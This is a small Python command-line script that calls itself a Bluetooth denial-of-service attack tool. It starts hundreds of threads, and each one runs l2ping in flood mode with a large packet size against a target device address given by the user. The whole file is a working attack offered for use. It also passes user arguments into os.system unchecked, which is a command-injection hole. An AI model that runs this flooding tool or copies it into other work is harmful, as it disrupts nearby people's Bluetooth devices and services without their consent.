import argparse
import os
import threading


def run_command(target_addr, package_size, interface):
    os.system(f'l2ping -i {interface} -s {str(package_size)} -f {target_addr}')


def parse_args():
    parser = argparse.ArgumentParser(description='Bluetooth DOS attack script v 2.0')
    parser.add_argument('-t', '--threads', required=False, help='Threads count', default=500, type=int)
    parser.add_argument('-ps', '--package-size', required=False, help='Package size', type=int, default=600)

    required = parser.add_argument_group('required arguments')
    required.add_argument('-a', '--target-addr', required=True, help='Target address', type=str)
    required.add_argument('-i', '--interface', required=True, help='Your bluetooth interface', type=str)

    return parser.parse_args()


def main():
    args = parse_args()

    threads = []

    for i in range(args.threads):
        threads.append(threading.Thread(target=run_command, args=(args.target_addr, args.package_size, args.interface)))


    for i in range(len(threads)):
        threads[i].run()


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('Finished')
        exit(0)